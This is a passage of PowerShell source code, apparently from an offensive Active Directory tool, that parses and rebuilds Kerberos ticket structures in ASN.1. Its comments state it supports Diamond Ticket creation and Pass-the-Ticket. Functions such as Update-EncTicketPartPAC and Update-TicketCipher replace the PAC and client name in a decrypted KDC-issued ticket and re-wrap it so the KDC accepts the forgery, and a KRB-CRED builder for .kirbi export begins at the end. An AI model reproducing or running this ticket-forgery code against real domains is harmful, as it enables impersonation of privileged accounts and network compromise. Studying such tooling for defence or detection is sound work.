        $content += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data $snameContent)
    }
    else {
        # NT-PRINCIPAL (1)
        $snameContent = @()
        $snameContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)
        $snameContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $ServerName))
        $content += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data $snameContent)
    }

    # [3] enc-part - EncryptedData
    $encDataContent = @()
    $encDataContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $EncryptionType)
    $encDataContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value $Kvno)
    $encDataContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $EncryptedPart)
    $encData = New-ASN1Sequence -Data $encDataContent
    $content += New-ASN1ContextTag -Tag 3 -Data $encData

    # Wrap in SEQUENCE and APPLICATION 1 tag (RFC 4120: Ticket ::= [APPLICATION 1] SEQUENCE {...})
    $ticketSeq = New-ASN1Sequence -Data $content
    return New-ASN1ApplicationTag -Tag 1 -Data $ticketSeq
}

#endregion

#region KRB-CRED Parser (for Diamond Tickets)

<#
.SYNOPSIS
    Parses a KRB-CRED (.kirbi) structure.

.DESCRIPTION
    Extracts ticket, session key, and metadata from a KRB-CRED structure.
    Used for Diamond Ticket creation where we need to modify an existing TGT.

    KRB-CRED ::= [APPLICATION 22] SEQUENCE {
        pvno [0] INTEGER (5),
        msg-type [1] INTEGER (22),
        tickets [2] SEQUENCE OF Ticket,
        enc-part [3] EncryptedData -- EncKrbCredPart
    }

.PARAMETER KirbiBytes
    The raw .kirbi file bytes.

.OUTPUTS
    PSCustomObject with:
    - Ticket: Raw ticket bytes (APPLICATION 6)
    - TicketRealm: Server realm
    - TicketSName: Server principal name
    - TicketEncPart: Encrypted ticket part (cipher bytes)
    - TicketEType: Encryption type
    - TicketKvno: Key version number
    - SessionKey: Session key bytes
    - SessionKeyType: Session key encryption type
    - ClientRealm: Client realm
    - ClientName: Client principal name
    - StartTime, EndTime, RenewTill: Ticket times
    - TicketFlags: Ticket flags bytes

.EXAMPLE
    $parsed = Read-KRBCred -KirbiBytes ([IO.File]::ReadAllBytes("ticket.kirbi"))
#>
function Read-KRBCred {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$KirbiBytes
    )

    try {
        $offset = 0

        Write-Log "[Read-KRBCred] Input: $($KirbiBytes.Length) bytes, first bytes: 0x$($KirbiBytes[0].ToString('X2')) 0x$($KirbiBytes[1].ToString('X2')) 0x$($KirbiBytes[2].ToString('X2'))"

        # Parse APPLICATION 22 tag
        $element = Read-ASN1Element -Data $KirbiBytes -Offset $offset
        if ($element.Tag -ne 0x76) {  # APPLICATION 22 = 0x40 + 0x20 + 22 = 0x76
            throw "Invalid KRB-CRED: Expected APPLICATION 22 tag, got 0x$($element.Tag.ToString('X2'))"
        }

        Write-Log "[Read-KRBCred] APPLICATION 22 parsed, content: $($element.ContentLength) bytes"

        # Parse inner SEQUENCE
        $innerOffset = 0
        $innerData = $element.Content
        $seqElement = Read-ASN1Element -Data $innerData -Offset $innerOffset

        if ($seqElement.Tag -ne 0x30) {
            throw "Invalid KRB-CRED: Expected SEQUENCE, got 0x$($seqElement.Tag.ToString('X2'))"
        }

        Write-Log "[Read-KRBCred] SEQUENCE parsed, content: $($seqElement.ContentLength) bytes"

        # Parse SEQUENCE children
        $children = Read-ASN1Children -Data $seqElement.Content
        Write-Log "[Read-KRBCred] Found $($children.Count) children in KRB-CRED SEQUENCE"

        $result = [PSCustomObject]@{
            Ticket = $null
            TicketRealm = $null
            TicketSName = $null
            TicketEncPart = $null
            TicketEType = 0
            TicketKvno = 0
            SessionKey = $null
            SessionKeyType = 0
            ClientRealm = $null
            ClientName = $null
            ServerRealm = $null
            ServerName = $null
            StartTime = $null
            EndTime = $null
            RenewTill = $null
            AuthTime = $null
            TicketFlags = $null
        }

        foreach ($child in $children) {
            $contextTag = $child.Tag -band 0x1F
            Write-Log "[Read-KRBCred] Processing child: tag=0x$($child.Tag.ToString('X2')), contextTag=$contextTag, contentLen=$($child.ContentLength)"

            switch ($contextTag) {
                0 {
                    # pvno [0] INTEGER - should be 5
                    $pvnoElement = Read-ASN1Element -Data $child.Content -Offset 0
                    $pvno = Read-ASN1Integer -Content $pvnoElement.Content
                    Write-Log "[Read-KRBCred] pvno = $pvno"
                    if ($pvno -ne 5) {
                        Write-Log "[Read-KRBCred] Warning: pvno is $pvno, expected 5"
                    }
                }
                1 {
                    # msg-type [1] INTEGER - should be 22
                    $msgTypeElement = Read-ASN1Element -Data $child.Content -Offset 0
                    $msgType = Read-ASN1Integer -Content $msgTypeElement.Content
                    Write-Log "[Read-KRBCred] msg-type = $msgType"
                    if ($msgType -ne 22) {
                        Write-Log "[Read-KRBCred] Warning: msg-type is $msgType, expected 22"
                    }
                }
                2 {
                    # tickets [2] SEQUENCE OF Ticket
                    Write-Log "[Read-KRBCred] Parsing tickets [2], child.Content first bytes: 0x$($child.Content[0].ToString('X2')) 0x$($child.Content[1].ToString('X2')), length=$($child.Content.Length)"
                    $ticketsSeq = Read-ASN1Element -Data $child.Content -Offset 0
                    Write-Log "[Read-KRBCred] ticketsSeq: tag=0x$($ticketsSeq.Tag.ToString('X2')), contentLen=$($ticketsSeq.ContentLength), first content bytes: 0x$($ticketsSeq.Content[0].ToString('X2')) 0x$($ticketsSeq.Content[1].ToString('X2'))"
                    $ticketElements = Read-ASN1Children -Data $ticketsSeq.Content
                    Write-Log "[Read-KRBCred] Found $($ticketElements.Count) ticket element(s)"

                    if ($ticketElements.Count -gt 0) {
                        # Get first ticket (APPLICATION 1 per RFC 4120)
                        $ticketElement = $ticketElements[0]
                        Write-Log "[Read-KRBCred] First ticket element: tag=0x$($ticketElement.Tag.ToString('X2')), totalLen=$($ticketElement.TotalLength)"

                        # Store raw ticket bytes (including APPLICATION tag)
                        # Read-ASN1Children parses from $ticketsSeq.Content, so ticket
                        # raw bytes are in $ticketsSeq.Content (NOT $child.Content which
                        # includes the outer SEQUENCE header).
                        # For the first element, offset within $ticketsSeq.Content is 0.
                        $result.Ticket = $ticketsSeq.Content[0..($ticketElement.TotalLength - 1)]
                        Write-Log "[Read-KRBCred] Extracted ticket: $($result.Ticket.Length) bytes, first byte: 0x$($result.Ticket[0].ToString('X2'))"

                        # Parse ticket structure
                        $ticketInfo = Read-KerberosTicket -TicketBytes $result.Ticket
                        Write-Log "[Read-KRBCred] Ticket parsed: Realm=$($ticketInfo.Realm), SName=$($ticketInfo.SName), EType=$($ticketInfo.EType), EncPart length=$($ticketInfo.EncPart.Length)"
                        $result.TicketRealm = $ticketInfo.Realm
                        $result.TicketSName = $ticketInfo.SName
                        $result.TicketEncPart = $ticketInfo.EncPart
                        $result.TicketEType = $ticketInfo.EType
                        $result.TicketKvno = $ticketInfo.Kvno
                    }
                    else {
                        Write-Log "[Read-KRBCred] WARNING: No ticket elements found in SEQUENCE!" -Level Warning
                    }
                }
                3 {
                    # enc-part [3] EncryptedData (EncKrbCredPart)
                    # For .kirbi files, this is typically etype 0 (unencrypted)
                    $encDataElement = Read-ASN1Element -Data $child.Content -Offset 0
                    $encDataChildren = Read-ASN1Children -Data $encDataElement.Content

                    foreach ($encChild in $encDataChildren) {
                        $encTag = $encChild.Tag -band 0x1F
                        if ($encTag -eq 2) {
                            # cipher [2] - contains EncKrbCredPart
                            $cipherElement = Read-ASN1Element -Data $encChild.Content -Offset 0
                            $encKrbCredPart = $cipherElement.Content

                            # Parse EncKrbCredPart [APPLICATION 29]
                            $credPartInfo = Read-EncKrbCredPart -EncKrbCredPartBytes $encKrbCredPart
                            $result.SessionKey = $credPartInfo.SessionKey
                            $result.SessionKeyType = $credPartInfo.SessionKeyType
                            $result.ClientRealm = $credPartInfo.ClientRealm
                            $result.ClientName = $credPartInfo.ClientName
                            $result.ServerRealm = $credPartInfo.ServerRealm
                            $result.ServerName = $credPartInfo.ServerName
                            $result.StartTime = $credPartInfo.StartTime
                            $result.EndTime = $credPartInfo.EndTime
                            $result.RenewTill = $credPartInfo.RenewTill
                            $result.AuthTime = $credPartInfo.AuthTime
                            $result.TicketFlags = $credPartInfo.TicketFlags
                        }
                    }
                }
            }
        }

        Write-Log "[Read-KRBCred] Parsing complete. Ticket=$($null -ne $result.Ticket), TicketEncPart=$($null -ne $result.TicketEncPart), SessionKey=$($null -ne $result.SessionKey), EType=$($result.TicketEType)"
        return $result
    }
    catch {
        Write-Log "[Read-KRBCred] Parse error: $_ at $($_.ScriptStackTrace)" -Level Error
        throw "Failed to parse KRB-CRED: $_"
    }
}

<#
.SYNOPSIS
    Parses a Kerberos Ticket structure.
#>
function Read-KerberosTicket {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$TicketBytes
    )

    $result = @{
        Realm = $null
        SName = $null
        EncPart = $null
        EType = 0
        Kvno = 0
    }

    # Parse APPLICATION tag (RFC 4120: Ticket ::= [APPLICATION 1], but accept both 1 and 6 for compatibility)
    $element = Read-ASN1Element -Data $TicketBytes -Offset 0
    $appTag = $element.Tag -band 0x1F
    if ($appTag -ne 1 -and $appTag -ne 6) {
        throw "Invalid Ticket: Expected APPLICATION 1 (or legacy 6), got tag $appTag"
    }

    # Parse inner SEQUENCE
    $seqElement = Read-ASN1Element -Data $element.Content -Offset 0
    $children = Read-ASN1Children -Data $seqElement.Content

    foreach ($child in $children) {
        $contextTag = $child.Tag -band 0x1F

        switch ($contextTag) {
            1 {
                # realm [1] Realm (GeneralString)
                $realmElement = Read-ASN1Element -Data $child.Content -Offset 0
                $result.Realm = Read-ASN1String -Content $realmElement.Content
            }
            2 {
                # sname [2] PrincipalName
                $snameSeq = Read-ASN1Element -Data $child.Content -Offset 0
                $snameChildren = Read-ASN1Children -Data $snameSeq.Content

                $nameStrings = @()
                foreach ($snameChild in $snameChildren) {
                    $snameTag = $snameChild.Tag -band 0x1F
                    if ($snameTag -eq 1) {
                        # name-string [1] SEQUENCE OF GeneralString
                        $nameSeq = Read-ASN1Element -Data $snameChild.Content -Offset 0
                        $nameElements = Read-ASN1Children -Data $nameSeq.Content
                        foreach ($nameEl in $nameElements) {
                            $nameStrings += Read-ASN1String -Content $nameEl.Content
                        }
                    }
                }
                $result.SName = $nameStrings -join '/'
            }
            3 {
                # enc-part [3] EncryptedData
                $encDataSeq = Read-ASN1Element -Data $child.Content -Offset 0
                $encDataChildren = Read-ASN1Children -Data $encDataSeq.Content

                foreach ($encChild in $encDataChildren) {
                    $encTag = $encChild.Tag -band 0x1F
                    switch ($encTag) {
                        0 {
                            # etype [0] Int32
                            $etypeEl = Read-ASN1Element -Data $encChild.Content -Offset 0
                            $result.EType = Read-ASN1Integer -Content $etypeEl.Content
                        }
                        1 {
                            # kvno [1] UInt32
                            $kvnoEl = Read-ASN1Element -Data $encChild.Content -Offset 0
                            $result.Kvno = Read-ASN1Integer -Content $kvnoEl.Content
                        }
                        2 {
                            # cipher [2] OCTET STRING
                            $cipherEl = Read-ASN1Element -Data $encChild.Content -Offset 0
                            $result.EncPart = $cipherEl.Content
                        }
                    }
                }
            }
        }
    }

    return $result
}

<#
.SYNOPSIS
    Parses an EncKrbCredPart structure.
#>
function Read-EncKrbCredPart {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$EncKrbCredPartBytes
    )

    $result = @{
        SessionKey = $null
        SessionKeyType = 0
        ClientRealm = $null
        ClientName = $null
        ServerRealm = $null
        ServerName = $null
        StartTime = $null
        EndTime = $null
        RenewTill = $null
        AuthTime = $null
        TicketFlags = $null
    }

    # Parse APPLICATION 29 tag
    $element = Read-ASN1Element -Data $EncKrbCredPartBytes -Offset 0
    if (($element.Tag -band 0x1F) -ne 29) {
        throw "Invalid EncKrbCredPart: Expected APPLICATION 29"
    }

    # Parse inner SEQUENCE
    $seqElement = Read-ASN1Element -Data $element.Content -Offset 0
    $children = Read-ASN1Children -Data $seqElement.Content

    foreach ($child in $children) {
        $contextTag = $child.Tag -band 0x1F

        if ($contextTag -eq 0) {
            # ticket-info [0] SEQUENCE OF KrbCredInfo
            $ticketInfoSeq = Read-ASN1Element -Data $child.Content -Offset 0
            $credInfoElements = Read-ASN1Children -Data $ticketInfoSeq.Content

            if ($credInfoElements.Count -gt 0) {
                # Parse first KrbCredInfo
                $credInfoSeq = $credInfoElements[0]
                $credInfoChildren = Read-ASN1Children -Data $credInfoSeq.Content

                foreach ($credChild in $credInfoChildren) {
                    $credTag = $credChild.Tag -band 0x1F

                    switch ($credTag) {
                        0 {
                            # key [0] EncryptionKey
                            $keySeq = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $keyChildren = Read-ASN1Children -Data $keySeq.Content

                            foreach ($keyChild in $keyChildren) {
                                $keyTag = $keyChild.Tag -band 0x1F
                                if ($keyTag -eq 0) {
                                    # keytype [0] Int32
                                    $ktEl = Read-ASN1Element -Data $keyChild.Content -Offset 0
                                    $result.SessionKeyType = Read-ASN1Integer -Content $ktEl.Content
                                }
                                elseif ($keyTag -eq 1) {
                                    # keyvalue [1] OCTET STRING
                                    $kvEl = Read-ASN1Element -Data $keyChild.Content -Offset 0
                                    $result.SessionKey = $kvEl.Content
                                }
                            }
                        }
                        1 {
                            # prealm [1] Realm (client realm)
                            $realmEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.ClientRealm = Read-ASN1String -Content $realmEl.Content
                        }
                        2 {
                            # pname [2] PrincipalName (client name)
                            $pnameSeq = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $pnameChildren = Read-ASN1Children -Data $pnameSeq.Content

                            foreach ($pnameChild in $pnameChildren) {
                                if (($pnameChild.Tag -band 0x1F) -eq 1) {
                                    $nameSeq = Read-ASN1Element -Data $pnameChild.Content -Offset 0
                                    $nameElements = Read-ASN1Children -Data $nameSeq.Content
                                    if ($nameElements.Count -gt 0) {
                                        $result.ClientName = Read-ASN1String -Content $nameElements[0].Content
                                    }
                                }
                            }
                        }
                        3 {
                            # flags [3] TicketFlags
                            $flagsEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $flagsData = Read-ASN1BitString -Content $flagsEl.Content
                            $result.TicketFlags = $flagsData.Data
                        }
                        4 {
                            # authtime [4] KerberosTime
                            $timeEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.AuthTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
                        }
                        5 {
                            # starttime [5] KerberosTime
                            $timeEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.StartTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
                        }
                        6 {
                            # endtime [6] KerberosTime
                            $timeEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.EndTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
                        }
                        7 {
                            # renew-till [7] KerberosTime
                            $timeEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.RenewTill = Read-ASN1GeneralizedTime -Content $timeEl.Content
                        }
                        8 {
                            # srealm [8] Realm (server realm)
                            $realmEl = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $result.ServerRealm = Read-ASN1String -Content $realmEl.Content
                        }
                        9 {
                            # sname [9] PrincipalName (server name)
                            $snameSeq = Read-ASN1Element -Data $credChild.Content -Offset 0
                            $snameChildren = Read-ASN1Children -Data $snameSeq.Content

                            $nameStrings = @()
                            foreach ($snameChild in $snameChildren) {
                                if (($snameChild.Tag -band 0x1F) -eq 1) {
                                    $nameSeq = Read-ASN1Element -Data $snameChild.Content -Offset 0
                                    $nameElements = Read-ASN1Children -Data $nameSeq.Content
                                    foreach ($nameEl in $nameElements) {
                                        $nameStrings += Read-ASN1String -Content $nameEl.Content
                                    }
                                }
                            }
                            $result.ServerName = $nameStrings -join '/'
                        }
                    }
                }
            }
        }
    }

    return $result
}

<#
.SYNOPSIS
    Parses an EncTicketPart structure (decrypted ticket content).

.DESCRIPTION
    Extracts all fields from a decrypted EncTicketPart including the PAC.

    EncTicketPart ::= [APPLICATION 3] SEQUENCE {
        flags [0] TicketFlags,
        key [1] EncryptionKey,
        crealm [2] Realm,
        cname [3] PrincipalName,
        transited [4] TransitedEncoding,
        authtime [5] KerberosTime,
        starttime [6] KerberosTime OPTIONAL,
        endtime [7] KerberosTime,
        renew-till [8] KerberosTime OPTIONAL,
        caddr [9] HostAddresses OPTIONAL,
        authorization-data [10] AuthorizationData OPTIONAL
    }

.PARAMETER EncTicketPartBytes
    The decrypted EncTicketPart bytes (starting with APPLICATION 3 tag).

.OUTPUTS
    PSCustomObject with all parsed fields including PAC.
#>
function Read-EncTicketPart {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$EncTicketPartBytes
    )

    $result = [PSCustomObject]@{
        Flags = $null
        SessionKey = $null
        SessionKeyType = 0
        ClientRealm = $null
        ClientName = $null
        Transited = $null
        AuthTime = $null
        StartTime = $null
        EndTime = $null
        RenewTill = $null
        ClientAddresses = $null
        AuthorizationData = $null
        PAC = $null
    }

    # Parse APPLICATION 3 tag
    $element = Read-ASN1Element -Data $EncTicketPartBytes -Offset 0
    if (($element.Tag -band 0x1F) -ne 3) {
        throw "Invalid EncTicketPart: Expected APPLICATION 3, got tag 0x$($element.Tag.ToString('X2'))"
    }

    # Parse inner SEQUENCE
    $seqElement = Read-ASN1Element -Data $element.Content -Offset 0
    $children = Read-ASN1Children -Data $seqElement.Content

    foreach ($child in $children) {
        $contextTag = $child.Tag -band 0x1F

        switch ($contextTag) {
            0 {
                # flags [0] TicketFlags
                $flagsEl = Read-ASN1Element -Data $child.Content -Offset 0
                $flagsData = Read-ASN1BitString -Content $flagsEl.Content
                $result.Flags = $flagsData.Data
            }
            1 {
                # key [1] EncryptionKey
                $keySeq = Read-ASN1Element -Data $child.Content -Offset 0
                $keyChildren = Read-ASN1Children -Data $keySeq.Content

                foreach ($keyChild in $keyChildren) {
                    $keyTag = $keyChild.Tag -band 0x1F
                    if ($keyTag -eq 0) {
                        $ktEl = Read-ASN1Element -Data $keyChild.Content -Offset 0
                        $result.SessionKeyType = Read-ASN1Integer -Content $ktEl.Content
                    }
                    elseif ($keyTag -eq 1) {
                        $kvEl = Read-ASN1Element -Data $keyChild.Content -Offset 0
                        $result.SessionKey = $kvEl.Content
                    }
                }
            }
            2 {
                # crealm [2] Realm
                $realmEl = Read-ASN1Element -Data $child.Content -Offset 0
                $result.ClientRealm = Read-ASN1String -Content $realmEl.Content
            }
            3 {
                # cname [3] PrincipalName
                $cnameSeq = Read-ASN1Element -Data $child.Content -Offset 0
                $cnameChildren = Read-ASN1Children -Data $cnameSeq.Content

                foreach ($cnameChild in $cnameChildren) {
                    if (($cnameChild.Tag -band 0x1F) -eq 1) {
                        $nameSeq = Read-ASN1Element -Data $cnameChild.Content -Offset 0
                        $nameElements = Read-ASN1Children -Data $nameSeq.Content
                        if ($nameElements.Count -gt 0) {
                            $result.ClientName = Read-ASN1String -Content $nameElements[0].Content
                        }
                    }
                }
            }
            4 {
                # transited [4] TransitedEncoding
                $transitedSeq = Read-ASN1Element -Data $child.Content -Offset 0
                $result.Transited = $transitedSeq.Content
            }
            5 {
                # authtime [5] KerberosTime
                $timeEl = Read-ASN1Element -Data $child.Content -Offset 0
                $result.AuthTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
            }
            6 {
                # starttime [6] KerberosTime OPTIONAL
                $timeEl = Read-ASN1Element -Data $child.Content -Offset 0
                $result.StartTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
            }
            7 {
                # endtime [7] KerberosTime
                $timeEl = Read-ASN1Element -Data $child.Content -Offset 0
                $result.EndTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
            }
            8 {
                # renew-till [8] KerberosTime OPTIONAL
                $timeEl = Read-ASN1Element -Data $child.Content -Offset 0
                $result.RenewTill = Read-ASN1GeneralizedTime -Content $timeEl.Content
            }
            9 {
                # caddr [9] HostAddresses OPTIONAL
                $result.ClientAddresses = $child.Content
            }
            10 {
                # authorization-data [10] AuthorizationData OPTIONAL
                $result.AuthorizationData = $child.Content

                # Try to extract PAC from authorization data
                $pac = Extract-PACFromAuthData -AuthDataBytes $child.Content
                if ($pac) {
                    $result.PAC = $pac
                }
            }
        }
    }

    return $result
}

<#
.SYNOPSIS
    Replaces the cipher bytes in a Kerberos Ticket while preserving the rest.
.DESCRIPTION
    Performs in-place replacement of the EncryptedData cipher field [2] within
    a Ticket's enc-part [3]. All other fields (tkt-vno, realm, sname, etype, kvno)
    are preserved byte-for-byte from the original KDC-generated ticket.
.PARAMETER OriginalTicketBytes
    The original raw Ticket bytes (APPLICATION 1).
.PARAMETER NewCipher
    The new ciphertext to replace the existing cipher.
#>
function Update-TicketCipher {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$OriginalTicketBytes,

        [Parameter(Mandatory=$true)]
        [byte[]]$NewCipher,

        [Parameter(Mandatory=$false)]
        [int]$NewKvno = -1,

        [Parameter(Mandatory=$false)]
        [int]$NewEType = -1
    )

    # Parse APPLICATION 1 outer tag
    $app1 = Read-ASN1Element -Data $OriginalTicketBytes -Offset 0

    # Parse inner SEQUENCE
    $seq = Read-ASN1Element -Data $app1.Content -Offset 0
    $children = Read-ASN1Children -Data $seq.Content

    # Walk through children, replace cipher in [3] enc-part
    $seqContent = $seq.Content
    $newSeqParts = New-Object System.Collections.Generic.List[byte]
    $pos = 0

    foreach ($child in $children) {
        $contextTag = $child.Tag -band 0x1F
        $rawBytes = [byte[]]$seqContent[$pos..($pos + $child.TotalLength - 1)]

        if ($contextTag -eq 3) {
            # enc-part [3] EncryptedData - replace cipher, optionally update etype/kvno
            $encDataSeq = Read-ASN1Element -Data $child.Content -Offset 0
            $encDataChildren = Read-ASN1Children -Data $encDataSeq.Content

            $newEncDataParts = New-Object System.Collections.Generic.List[byte]
            $edPos = 0

            foreach ($edChild in $encDataChildren) {
                $edTag = $edChild.Tag -band 0x1F
                $edRawBytes = [byte[]]$encDataSeq.Content[$edPos..($edPos + $edChild.TotalLength - 1)]

                if ($edTag -eq 0 -and $NewEType -ge 0) {
                    # etype [0] Int32 - update with new etype
                    $newETypeField = [byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $NewEType))
                    $newEncDataParts.AddRange($newETypeField)
                    Write-Verbose "[Update-TicketCipher] Updated etype to $NewEType"
                }
                elseif ($edTag -eq 1 -and $NewKvno -ge 0) {
                    # kvno [1] UInt32 OPTIONAL - update with new kvno
                    $newKvnoField = [byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value $NewKvno))
                    $newEncDataParts.AddRange($newKvnoField)
                    Write-Verbose "[Update-TicketCipher] Updated kvno to $NewKvno"
                }
                elseif ($edTag -eq 2) {
                    # cipher [2] OCTET STRING - replace with new cipher
                    $newCipherField = [byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $NewCipher))
                    $newEncDataParts.AddRange($newCipherField)
                } else {
                    # Preserve original field as-is
                    $newEncDataParts.AddRange($edRawBytes)
                }

                $edPos += $edChild.TotalLength
            }

            # Rebuild EncryptedData SEQUENCE and context tag [3]
            $newEncData = [byte[]](New-ASN1Sequence -Data ([byte[]]$newEncDataParts.ToArray()))
            $newEncPart = [byte[]](New-ASN1ContextTag -Tag 3 -Data $newEncData)
            $newSeqParts.AddRange($newEncPart)
        } else {
            # Preserve [0] tkt-vno, [1] realm, [2] sname as original raw bytes
            $newSeqParts.AddRange($rawBytes)
        }

        $pos += $child.TotalLength
    }

    # Rebuild SEQUENCE and APPLICATION 1 wrappers
    $newSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newSeqParts.ToArray()))
    $newTicket = [byte[]](New-ASN1ApplicationTag -Tag 1 -Data $newSeq)

    return $newTicket
}

<#
.SYNOPSIS
    Updates the PAC and optionally client name in a decrypted EncTicketPart.
.DESCRIPTION
    Performs in-place binary replacement of the authorization-data (PAC) and
    optionally the cname field in a decrypted EncTicketPart. All other fields
    (flags, key, crealm, transited, times, caddr) are preserved byte-for-byte
    from the original KDC-generated EncTicketPart.

    This is critical for Diamond Tickets because rebuilding the EncTicketPart
    from scratch can introduce subtle ASN.1 encoding differences that cause
    the KDC to reject the ticket.
.PARAMETER EncTicketPartBytes
    The original decrypted EncTicketPart bytes (starting with APPLICATION 3 tag).
.PARAMETER NewPACData
    The modified PAC data to replace the existing PAC.
.PARAMETER NewClientName
    Optional new client name to replace the existing cname.
#>
function Update-EncTicketPartPAC {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$EncTicketPartBytes,

        [Parameter(Mandatory=$true)]
        [byte[]]$NewPACData,

        [Parameter(Mandatory=$false)]
        [string]$NewClientName
    )

    # Parse APPLICATION 3 outer tag
    $app3 = Read-ASN1Element -Data $EncTicketPartBytes -Offset 0
    if (($app3.Tag -band 0x1F) -ne 3) {
        throw "Invalid EncTicketPart: Expected APPLICATION 3, got tag 0x$($app3.Tag.ToString('X2'))"
    }

    # Parse inner SEQUENCE
    $seq = Read-ASN1Element -Data $app3.Content -Offset 0
    $children = Read-ASN1Children -Data $seq.Content

    # Walk through children, collect raw bytes, replace [3] cname and [10] authorization-data
    $seqContent = $seq.Content
    $newSeqParts = New-Object System.Collections.Generic.List[byte]
    $pos = 0

    foreach ($child in $children) {
        $contextTag = $child.Tag -band 0x1F
        $rawBytes = [byte[]]$seqContent[$pos..($pos + $child.TotalLength - 1)]

        if ($contextTag -eq 3 -and $NewClientName) {
            # Replace cname [3] PrincipalName with new client name
            # PrincipalName ::= SEQUENCE { name-type [0] INT32, name-string [1] SEQUENCE OF GeneralString }
            $cnameContent = New-Object System.Collections.Generic.List[byte]
            $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)))  # NT-PRINCIPAL
            $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $NewClientName))))
            $newCname = [byte[]](New-ASN1ContextTag -Tag 3 -Data (New-ASN1Sequence -Data ([byte[]]$cnameContent.ToArray())))
            $newSeqParts.AddRange($newCname)
        }
        elseif ($contextTag -eq 10) {
            # Replace authorization-data [10] with new PAC
            $newAuthzData = New-PACAuthorizationData -PACData $NewPACData
            $newAuthzField = [byte[]](New-ASN1ContextTag -Tag 10 -Data $newAuthzData)
            $newSeqParts.AddRange($newAuthzField)
        }
        else {
            # Preserve original bytes exactly
            $newSeqParts.AddRange($rawBytes)
        }

        $pos += $child.TotalLength
    }

    # Rebuild SEQUENCE and APPLICATION 3 wrappers
    $newSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newSeqParts.ToArray()))
    $newEncTicketPart = [byte[]](New-ASN1ApplicationTag -Tag 3 -Data $newSeq)

    return $newEncTicketPart
}

<#
.SYNOPSIS
    Extracts PAC from AuthorizationData structure.
#>
function Extract-PACFromAuthData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$AuthDataBytes
    )

    try {
        # AuthorizationData ::= SEQUENCE OF SEQUENCE { ad-type, ad-data }
        $seqElement = Read-ASN1Element -Data $AuthDataBytes -Offset 0
        $adEntries = Read-ASN1Children -Data $seqElement.Content

        foreach ($adEntry in $adEntries) {
            $entrySeq = $adEntry
            $entryChildren = Read-ASN1Children -Data $entrySeq.Content

            $adType = 0
            $adData = $null

            foreach ($entryChild in $entryChildren) {
                $entryTag = $entryChild.Tag -band 0x1F
                if ($entryTag -eq 0) {
                    # ad-type [0] Int32
                    $typeEl = Read-ASN1Element -Data $entryChild.Content -Offset 0
                    $adType = Read-ASN1Integer -Content $typeEl.Content
                }
                elseif ($entryTag -eq 1) {
                    # ad-data [1] OCTET STRING
                    $dataEl = Read-ASN1Element -Data $entryChild.Content -Offset 0
                    $adData = $dataEl.Content
                }
            }

            # AD-IF-RELEVANT (1) contains nested authorization data
            if ($adType -eq 1 -and $adData) {
                $nestedPac = Extract-PACFromAuthData -AuthDataBytes $adData
                if ($nestedPac) {
                    return $nestedPac
                }
            }

            # AD-WIN2K-PAC (128) contains the actual PAC
            if ($adType -eq 128 -and $adData) {
                return $adData
            }
        }

        return $null
    }
    catch {
        Write-Log "[Extract-PACFromAuthData] Error: $_" -Level Error
        return $null
    }
}

#endregion

#region KRB-CRED Builder

<#
.SYNOPSIS
    Builds a KRB-CRED structure for kirbi file export.

.DESCRIPTION
    Creates a proper KRB-CRED (APPLICATION 22) structure that includes both the
    ticket and the session key. This format is required for Pass-the-Ticket (PTT)
    because the session key is needed to decrypt the service ticket.

    The raw ticket (APPLICATION 1) alone is NOT sufficient for PTT.

.PARAMETER Ticket
    The raw ticket bytes (APPLICATION 1 - Ticket structure per RFC 4120).

.PARAMETER SessionKey
    The session key bytes from the encrypted part.

.PARAMETER SessionKeyType
    The encryption type of the session key (17=AES128, 18=AES256, 23=RC4).

.PARAMETER Realm
    The Kerberos realm (domain name in uppercase).

.PARAMETER ClientName
    The client principal name (sAMAccountName).

.PARAMETER ServerName
    The server principal name (e.g., "krbtgt" for TGT).

.PARAMETER ServerInstance
    The server instance (e.g., realm for TGT, hostname for service ticket).

.PARAMETER StartTime
    Optional start time for the ticket. Defaults to now.

.PARAMETER EndTime
    Optional end time for the ticket. Defaults to 10 hours from now.

.PARAMETER RenewTill
    Optional renewal time for the ticket. Defaults to 7 days from now.

.OUTPUTS
    [byte[]] The KRB-CRED structure as a byte array, ready to write to .kirbi file.

.EXAMPLE
